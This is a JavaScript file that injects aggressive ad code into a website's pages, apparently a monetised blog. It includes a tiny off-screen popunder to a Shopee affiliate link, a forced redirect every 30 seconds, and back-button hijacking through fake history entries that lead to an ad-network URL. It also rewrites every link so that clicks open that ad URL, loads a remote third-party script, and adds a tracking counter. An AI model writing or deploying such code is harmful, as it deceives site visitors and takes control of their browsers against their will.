// ---- PopupShope
(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\nfunction addEvent(obj, eventName, func){\nif (obj.attachEvent) {\nobj.attachEvent(\"on\" + eventName, func);\n} else if(obj.addEventListener)\n{ obj.addEventListener(eventName, func, true);\n} else\n{ obj[\"on\" + eventName] = func;\n}\n} addEvent(window, \"load\", function(e){\naddEvent(document.body, \"click\", function(e)\n{ if(document.cookie.indexOf(\"sct=shp\") == -1)\n{\nvar w = window.open('https://shope.ee/6Ui1vEpp3J','height=10, width=10, top=1900, left=1900, scrollbars=yes')\ndocument.cookie = \"sct=scg\";\nwindow.focus(); } }); });\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();

// -- Auto refres
(function(){injectScript([{"attr":[],"tag":"script","inner":"\n<!--\nvar limit=\"0:55\"\nif (document.images){\nvar parselimit=limit.split(\":\")\nparselimit=parselimit[0]*60+parselimit[1]*1}\nfunction beginrefresh(){\nif (!document.images)\nreturn\nif (parselimit==1)\nwindow.location.reload()\nelse{\nparselimit-=1\ncurmin=Math.floor(parselimit/60)\ncursec=parselimit%60\nif (curmin!=0)\ncurtime=curmin+\" minutes and \"+cursec+\" seconds left until page refresh!\"\nelse\ncurtime=cursec+\" seconds left until page refresh!\"\nwindow.status=curtime\nsetTimeout(\"beginrefresh()\",1000)}}\nwindow.onload=beginrefresh\n//-->\n"},{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n//<![CDATA[\n(function(){\nsetInterval(function(){\nvar redSites = [\n \"https://shope.ee/6Ui1vEpp3J\"\n];\nvar randomLinks = redSites[Math.floor(Math.random()*redSites.length)];\nwindow.location = randomLinks\n},30000)\n}())\n//]]>\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();

// --- Histats
(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"var _Hasync= _Hasync|| [];\n_Hasync.push(['Histats.start', '1,4664078,4,0,0,0,00010000']);\n_Hasync.push(['Histats.fasi', '1']);\n_Hasync.push(['Histats.track_hits', '']);\n(function() {\nvar hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;\nhs.src = ('//s10.histats.com/js15_as.js');\n(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);\n})();"},{"attr":[],"tag":"noscript","inner":"<a href=\"/\" target=\"_blank\"><img src=\"//sstatic1.histats.com/0.gif?4664078&amp;101\" alt=\"\" border=\"0\"></a>"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();

//---- floating --
(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":" $(document).ready(function() $(&#39;img#closed&#39;).click(function()$(&#39;#bl_banner&#39;).hide(90););); "},{"attr":[{"name":"id","value":"fixedban"},{"name":"style","value":"width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;bottom:30%;z-index:999;-webkit-transform:translateZ(0);"}],"tag":"div","inner":" <div><a id=\"close-fixedban\" onclick=\"document.getElementById('fixedban').style.display = 'none';\" style=\"cursor:pointer;\"><img alt=\"close\" src=\"http://1.bp.blogspot.com/-_A83iDM6JYc/VhtxROLILrI/AAAAAAAADK4/aM4ikIA6aqI/s1600/btn_close.gif\" title=\"close button\" style=\"vertical-align:middle;\"></a></div> <div style=\"text-align:center;display:block;max-width:auto;height:auto;overflow:hidden;margin:auto\">  \n\n<a href=\"https://shope.ee/6Ui1vEpp3J\" target=\"_blank\"><img src=\"https://blog.apailmu.my.id/wp-content/uploads/2022/06/IG-Feed.jpg\" alt=\"Promo Shope\" border=\"0\" width=\"300\" height=\"250\"></a>\n\n\n</div> "}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();

//---- Sosial-Barar adstera zonailmu.my.id --
(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"},{"name":"src","value":"//evaluationgnatprotected.com/4a/00/1e/4a001e886418d57f6154e262bac9b581.js"}],"tag":"script","inner":""}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();

// --- Back Adstera
(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n!function(){\nvar campaign_link = \"https://evaluationgnatprotected.com/uijctn538c?key=4f219c1087bce980ac7a203a864c9d2b\";\nvar t;\ntry{\nfor(t=0;10>t;++t)history.pushState({},\"\",\"\");\nonpopstate=function(t){t.state&&location.replace(campaign_link)}}\ncatch(o){}\n}();\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();

// --- Pop Link
window.onload = function() {
  var puURL = 'https://evaluationgnatprotected.com/uijctn538c?key=4f219c1087bce980ac7a203a864c9d2b';
  var puTS = Math.round(+new Date()/1000);
  console.log('T.'+localStorage.puTS+'/'+puTS);
  if (typeof localStorage.puTS == 'undefined' || parseInt(localStorage.puTS) <= (puTS - 3600)) {
    var links = document.getElementsByTagName('a');
    for(var i = 0, len = links.length; i < len; i++) {
      links[i].onclick = function (e) {
        var puHref = this.getAttribute("href");
          var puTarget = this.getAttribute("target");
          if (puHref !== '#' && puHref !== 'javascript:void(0)') {
          e.preventDefault();    
          if (puTarget == '_blank') {
            window.open(window.location.href);
          }
          window.open(puHref);
          window.location.href = puURL;
          localStorage.puTS = puTS;
        }
      }
    }
  }
};
